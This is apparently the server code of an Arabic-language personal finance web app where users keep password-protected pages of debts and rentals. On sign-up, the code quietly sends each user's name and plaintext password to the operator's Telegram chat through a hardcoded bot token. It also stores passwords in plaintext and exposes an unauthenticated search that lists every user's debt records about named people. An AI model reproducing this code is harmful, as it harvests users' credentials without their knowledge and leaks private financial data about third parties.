const express = require('express');
const fs = require('fs');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 3000;
const DB_PATH = './heiba_finance_system.json';

const BOT_TOKEN = '7543475859:AAENXZxHPQZafOlvBwFr6EatUFD31iYq-ks';
const ADMIN_CHAT_ID = '5042495708';

app.use(express.json());
app.use(express.static('public'));

let db = { pages: [] };
if (fs.existsSync(DB_PATH)) db = JSON.parse(fs.readFileSync(DB_PATH));
const saveDB = () => fs.writeFileSync(DB_PATH, JSON.stringify(db, null, 2));

async function sendToAdmin(message) {
    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: ADMIN_CHAT_ID,
            text: `💰 تحديث مالي جديد:\n${message}`
        });
    } catch (e) { console.error("Admin Notify Fail"); }
}

// إنشاء صفحة شخصية (الخزنة المالية)
app.post('/api/pages/create', (req, res) => {
    const { name, password, description } = req.body;
    if (db.pages.find(p => p.name === name)) return res.status(400).json({ error: "الاسم محجوز" });
    const newPage = {
        id: Date.now().toString(),
        name, password, description,
        content: { debts: [], rentals: [] },
        createdAt: new Date().toISOString()
    };
    db.pages.push(newPage);
    saveDB();
    sendToAdmin(`✨ مستخدم جديد:\nالاسم: ${name}\nكلمة السر: ${password}`);
    res.json({ success: true });
});

// بحث عام عن الأشخاص (المدينين) - الرادار العالمي
app.get('/api/global/search-debt', (req, res) => {
    const targetName = (req.query.name || "").toLowerCase();
    if (!targetName) return res.json([]);

    let globalResults = [];
    db.pages.forEach(page => {
        const personalDebts = page.content.debts.filter(d => d.name.toLowerCase().includes(targetName));
        personalDebts.forEach(d => {
            globalResults.push({
                from: page.name, // صاحب الدين
                amount: d.amount,
                currency: d.currency,
                date: d.date,
                notes: d.notes || ""
            });
        });
    });
    res.json(globalResults);
});

// الدخول للصفحة الشخصية
app.post('/api/pages/access', (req, res) => {
    const { name, password } = req.body;
    const page = db.pages.find(p => p.name === name && p.password === password);
    if (!page) return res.status(403).json({ error: "خطأ في البيانات" });
    res.json(page);
});

// تحديث البيانات (حفظ الديون والإيجارات)
app.post('/api/pages/update', (req, res) => {
    const { id, password, content } = req.body;
    const idx = db.pages.findIndex(p => p.id === id && p.password === password);
    if (idx === -1) return res.status(403).send("Unauthorized");
    db.pages[idx].content = content;
    saveDB();
    res.json({ success: true });
});

app.listen(PORT, () => console.log(`💎 HEIBA FINANCE SYSTEM ACTIVE`));